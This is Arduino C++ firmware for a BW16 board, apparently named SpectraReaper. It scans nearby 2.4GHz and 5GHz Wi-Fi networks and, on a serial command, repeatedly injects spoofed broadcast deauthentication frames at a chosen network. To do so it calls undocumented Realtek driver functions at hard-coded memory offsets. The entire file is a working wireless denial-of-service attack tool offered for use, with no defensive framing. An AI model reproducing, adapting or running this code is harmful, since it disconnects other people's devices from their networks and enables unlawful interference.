/*
 * SpectraReaper
 * A tool that deauth 2.4GHz and 5GHz Wi-Fi networks via BW16 on serial console.
 * Author - WireBits
 */

#include <map>
#include <vector>
#include <WiFi.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <WiFiClient.h>
#include <wifi_structures.h>

#define FRAMES_PER_DEAUTH 5

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

uint8_t deauth_bssid[6];
int current_channel = 1;
bool is_scanning = false;
uint16_t deauth_reason = 2;
int current_deauth_index = 0;
std::vector<int> deauth_wifis;
unsigned long lastDeauthTime = 0;
std::vector<WiFiScanResult> scan_results;

int scanNetworks() {
  scan_results.clear();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, HIGH);
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH);
    digitalWrite(LED_B, LOW);
    return 0;
  } else {
    return 1;
  }
}

void sendWifiRawManagementFrames(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);
  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

void sendDeauthenticationFrames(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  sendWifiRawManagementFrames(&frame, sizeof(DeauthFrame));
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

void startShowScannedNetworks() {
  Serial.println("[*] Scanning for networks...");
  if (scanNetworks() == 0) {
    is_scanning = true;
    Serial.println("\n[*] Scanned WiFi Networks:");
    for (int i = 0; i < scan_results.size(); i++) {
      String frequency = (scan_results[i].channel <= 14) ? "2.4GHz" : "5GHz";
      char indexStr[3];
      snprintf(indexStr, sizeof(indexStr), "%02d", i);
      Serial.println("-------------------------------------------------");
      Serial.print("[" + String(indexStr) + "] - SSID    : "); Serial.println(scan_results[i].ssid);
      Serial.print("       BSSID   : "); Serial.println(scan_results[i].bssid_str);
      Serial.print("       Channel : "); Serial.println(scan_results[i].channel);
      Serial.print("       RSSI    : "); Serial.println(scan_results[i].rssi);
      Serial.print("       Frequency : "); Serial.println(frequency);
      Serial.println("-------------------------------------------------");
    }
  } else {
    Serial.println("[!] Scanning Failed!");
  }
}

void showHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  scan on     - Scan for nearby WiFi networks");
  Serial.println("  deauth X    - Start deauth attack on network X (X = Index Number)");
  Serial.println("  deauth off  - Stop deauth attack");
  Serial.println("  help        - Show this help message\n");
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  wifi_on(RTW_MODE_STA);
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  Serial.print("SpectraReaper");
  Serial.print("\nType 'help' to get available commands.");
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readString();
    command.trim();
    if (command == "scan on") {
      startShowScannedNetworks();
    } else if (command.startsWith("deauth ")) {
      String arg = command.substring(7);
      arg.trim();
      if (arg == "off") {
        deauth_wifis.clear();
        Serial.println("[*] Deauth Attack Stopped!");
      } else {
        int index = arg.toInt();
        if (index >= 0 && index < scan_results.size()) {
          deauth_wifis.push_back(index);
          current_deauth_index = 0;
          Serial.println("[*] Deauth Attack Started!");
        } else {
          Serial.println("[!] Invalid Index!");
        }
      }
    } else if (command == "help") {
      showHelp();
    }
  }
  if (!deauth_wifis.empty() && millis() - lastDeauthTime >= 100) {
    lastDeauthTime = millis();
    int idx = deauth_wifis[current_deauth_index];
    memcpy(deauth_bssid, scan_results[idx].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      sendDeauthenticationFrames(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);
    current_deauth_index++;
    if (current_deauth_index >= deauth_wifis.size()) {
      current_deauth_index = 0;
    }
  }
}
